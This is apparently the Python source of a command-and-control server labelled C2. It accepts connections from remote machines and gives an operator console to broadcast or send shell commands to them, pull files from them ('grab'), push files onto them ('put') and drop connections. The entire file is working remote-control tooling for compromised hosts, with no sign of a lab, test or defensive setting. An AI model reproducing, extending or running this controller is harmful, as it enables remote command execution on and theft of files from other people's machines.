#!/usr/bin/env python3
import socket 
import threading
import tqdm
import os
from C2utils import snd_msg, get_msg, snd_file, get_file

r = open("../port", 'r')
port = int(r.readline())
r.close()
w = open("../port", 'w')
port = port + 1
w.write(str(port))
w.close()


## ========  Config  ========
HEADER = 64
PORT = port
#PORT = 5050
#SERVER = '10.96.10.191'
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "exit"
SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 # send 4096 bytes each time step

## ========  Globals  ========
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)
connected_machines = []

            
# Processes the user input
def handle_user():

    while True:
        cmd = input("> ") 
        cmd_lst = cmd.split()
        if len(cmd_lst) <= 0:
            continue

        ## Broadcast
        elif cmd_lst[0] == "broadcast":
            new_cmd = cmd_lst[1:]
            if len(new_cmd) < 1:
                print("Usage: broadcast <cmd>")
                continue
            new_cmd = ' '.join(new_cmd)
            print(f'Sending \"{new_cmd}\" to...')
            itr = 1
            for data in connected_machines:
                print(f"{str(itr)}) {data['addr'][0]}")
                message = new_cmd.encode(FORMAT)
                length = str(len(message)).encode(FORMAT)
                length += b' ' * (HEADER - len(length))
                data['conn'].send(length)
                data['conn'].send(message)
                resp = get_msg(data['conn'])
                print(resp)
                print("=============================================")
                itr = itr + 1


        ## List
        elif cmd_lst[0] == "list":
            count = 1
            for data in connected_machines:
                print(f'{str(count)}) {data["addr"][0]}')
                count = count + 1
        ## Send
        elif cmd_lst[0] == "send":
            new_cmd = cmd_lst[1:]
            if len(new_cmd) < 1:
                print("Usage: send <ip> <cmd>")
                continue
            sent = False
            for data in connected_machines:
                if data['addr'][0] == new_cmd[0]:
                    sent = True
                    new_cmd = ' '.join(new_cmd[1:])
                    print(f'Sending \"{new_cmd}\" to {data["addr"][0]}')
                    message = new_cmd.encode(FORMAT)
                    length = str(len(message)).encode(FORMAT)
                    length += b' ' * (HEADER - len(length))
                    data['conn'].send(length)
                    data['conn'].send(message)
                    resp = get_msg(data['conn'])
                    print(resp)

            if not sent:
                print(f'{new_cmd[0]} is not connected to the server.')
    
        ## grab
        elif cmd_lst[0] == "grab":
            if len(cmd_lst) != 3:
                print("Usage: grab <filename> <ip>")
                continue
            for data in connected_machines:
                if data['addr'][0] == cmd_lst[2]:
                    print(get_file(data['conn'], cmd_lst[1]))

         

        ## put
        elif cmd_lst[0] == "put":
            if len(cmd_lst) < 2:
                print("Usage: put <filename> <ip>")
                continue

            for data in connected_machines:
                if data['addr'][0] == cmd_lst[2]:
                    print(snd_file(data['conn'], cmd_lst[1]))

        ## Close
        elif cmd_lst[0] == "close":
            for data in connected_machines:
                if data['addr'][0] == cmd_lst[1]:
                    snd_msg(data['conn'], "close")
                    data['conn'].close()
                    connected_machines.remove(data)

        ## help
        elif cmd_lst[0] == "help":
            print("1. broadcast <cmd here>")
            print("2. list")
            print("3. send <ip> <cmd here>")
            print("4. put <filename> <ip>")
            print("5. grab <filename> <ip>")
            print("6. close <ip>")
            print("7. help")

        ## Cmd not recognized
        else:
            print("Sorry, did not recognize that command.")
    

def start():
    server.listen()
    print(f"Server is listening on {SERVER}")
    t = threading.Thread(target=handle_user, args=())
    t.start()
    while True:
        conn, addr = server.accept()
        data = {
            'conn': conn,
            'addr': addr,
        }
        connected_machines.append(data)


start()
